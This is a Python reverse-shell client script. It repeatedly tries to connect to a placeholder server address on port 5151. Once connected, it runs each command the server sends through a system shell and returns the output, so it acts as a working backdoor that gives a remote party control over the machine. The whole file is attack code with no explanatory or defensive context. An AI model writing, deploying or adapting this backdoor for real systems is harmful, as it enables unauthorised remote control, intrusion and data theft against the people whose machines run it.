import socket, os, subprocess, time

active = True
connected = False

def connect ():
    global connected
    os.system("cls")
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 5151
    host = "SERVER IP ADDRESS GOES HERE"
    while 1:
        try:
            print("[!] Trying to connect to %s:%s" %(host, port))
            s.connect((host, port))
            connected = True
            print("[*] Connection established!\n")
            s.send((str(os.getcwd()) + ">").encode())
            print(str(os.getcwd()) + ">", end = "")
            break
        except Exception as e:
            print("Error: " + str(e))
            print("Could not connect.")
            time.sleep(2)

def receive():
    global connected
    global active
    try:
        receive = (s.recv(1024)).decode()
    except:
        connected = False
    if connected == True:
        if receive == "quit":
            active = False
            args = "Quitting..."
        elif len(receive) > 0:
            if receive[:2] == "cd":
                  os.chdir(receive[3:])
            proc2 = subprocess.Popen(receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = (proc2.stdout.read() + proc2.stderr.read()).decode()
            args = stdout_value + "\n" + str(os.getcwd()) + ">"
            print("\n" + args, end = "")
        else:
            args = "No valid input was given."
        send(args)

def send(args):
    args = args.encode()
    try:
        s.send(args)
    except:
        connected = False
    receive()

while active:
    connect()
    receive()

s.close()
input()
